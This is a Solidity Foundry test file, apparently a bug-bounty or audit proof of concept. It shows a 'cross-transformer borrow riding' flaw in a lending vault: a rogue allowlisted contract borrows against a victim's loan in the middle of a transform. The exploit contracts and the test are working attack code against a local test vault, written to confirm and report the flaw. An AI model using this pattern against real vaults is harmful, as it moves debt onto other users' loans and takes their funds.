// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {V4VaultLocalBase} from "test/vault/support/V4VaultLocalBase.sol";
import {IVault} from "src/vault/interfaces/IVault.sol";

/// @notice Rogue B: allowlisted, borrows the victim loan when called mid-transform.
contract RogueBorrower {
    IVault public vault;
    constructor(IVault v) { vault = v; }
    function ride(uint256 tokenId, uint256 amount) external {
        vault.borrow(tokenId, amount);
    }
    fallback() external {}
}

/// @notice Honest A: allowlisted, its flight performs one external call to B.
/// @dev Models swap-callback/hook-receiver reachability inside a transformer.
contract HonestWithCallback {
    RogueBorrower public b;
    uint256 public targetToken;
    uint256 public rideAmount;
    constructor(RogueBorrower _b) { b = _b; }
    function setRide(uint256 t, uint256 a) external { targetToken = t; rideAmount = a; }
    fallback() external {
        if (targetToken != 0) b.ride(targetToken, rideAmount);
    }
}

/// @notice V7 PoC: cross-transformer borrow riding.
/// Invariant: only transformer A named in this transform() may use transform-mode.
/// Falsifier: if the transform REVERTS at end-health on ANY B-borrow (no healthy-remaining
/// X exists), impact = grief-only (revert of victim's transform) -> downgrade, do not file.
/// If it SUCCEEDS with B paid + debt on victim loan -> theft path, file with this trace.
/// Run: forge test --match-contract V7BorrowRidingPoC -vvv
contract V7BorrowRidingPoC is V4VaultLocalBase {
    RogueBorrower internal b;
    HonestWithCallback internal a;

    function setUp() public override {
        super.setUp();
        b = new RogueBorrower(IVault(address(vault)));
        a = new HonestWithCallback(b);
        vault.setTransformer(address(a), true);
        vault.setTransformer(address(b), true);
        _deposit(lender, 1_000_000 ether);
    }

    function test_crossTransformerBorrowRiding() public {
        uint256 tokenId = _createLoan(1e15);
        // mock oracle values the position at 1 ether; borrow small so room stays healthy
        uint256 rideAmount = 0.01 ether;

        a.setRide(tokenId, rideAmount);
        uint256 bBalBefore = asset.balanceOf(address(b));

        vm.prank(borrower);
        try vault.transform(tokenId, address(a), "") {
            uint256 bBalAfter = asset.balanceOf(address(b));
            (uint256 debt,,,,) = vault.loanInfo(tokenId);
            // INVARIANT BROKEN iff B got paid and the loan absorbed the debt while healthy
            assertGt(bBalAfter, bBalBefore, "B extracted value mid-transform");
            assertGt(debt, 0, "victim loan absorbed B debt");
        } catch {
            // end-health reverted: grief-only -> do NOT file as theft
            assertTrue(false, "v7 grief-only: end-health reverted on B-borrow");
        }
    }
}
